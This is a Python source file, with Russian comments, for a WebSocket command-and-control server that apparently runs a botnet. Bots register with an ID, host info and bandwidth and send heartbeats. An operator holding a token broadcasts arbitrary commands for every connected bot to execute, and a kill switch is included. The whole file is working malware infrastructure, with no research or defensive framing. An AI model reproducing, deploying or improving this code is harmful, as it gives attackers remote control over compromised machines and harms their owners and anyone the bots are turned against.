import asyncio
import websockets
import json
import os
from utils.logger import log

connected_bots = {}  # {bot_id: {'ws': websocket, 'info': {}}}
KILL_SWITCH_TOKEN = os.environ.get('KILL_TOKEN', 'default_kill')

async def handler(websocket, path):
    bot_id = None
    try:
        async for message in websocket:
            data = json.loads(message)
            cmd = data.get('cmd')
            
            if cmd == 'register':
                bot_id = data['bot_id']
                connected_bots[bot_id] = {
                    'ws': websocket,
                    'info': data.get('info', {}),
                    'bandwidth_mbps': data.get('bandwidth', 10)
                }
                await websocket.send(json.dumps({'status': 'ok'}))
                log(f'[C2] Bot {bot_id} online')
                
            elif cmd == 'heartbeat':
                if bot_id in connected_bots:
                    connected_bots[bot_id]['last_seen'] = asyncio.get_event_loop().time()
                    
            elif cmd == 'command':
                # Админская команда рассылается всем
                if data.get('token') != KILL_SWITCH_TOKEN:
                    continue
                broadcast_cmd = data['payload']
                await broadcast(json.dumps({'cmd': 'execute', 'data': broadcast_cmd}))
                
    except websockets.exceptions.ConnectionClosed:
        pass
    finally:
        if bot_id:
            del connected_bots[bot_id]
            log(f'[C2] Bot {bot_id} offline')

async def broadcast(message: str):
    if connected_bots:
        await asyncio.wait([bot['ws'].send(message) for bot in connected_bots.values()])

# Улучшение №8: Kill switch
async def kill_switch(token: str):
    if token == KILL_SWITCH_TOKEN:
        await broadcast(json.dumps({'cmd': 'kill'}))
        log('[C2] KILL SWITCH ACTIVATED')
        return True
    return False

async def main():
    async with websockets.serve(handler, '0.0.0.0', 8888):
        log('[C2] WebSocket C2 запущен на порту 8888')
        await asyncio.Future()

if __name__ == '__main__':
    asyncio.run(main())
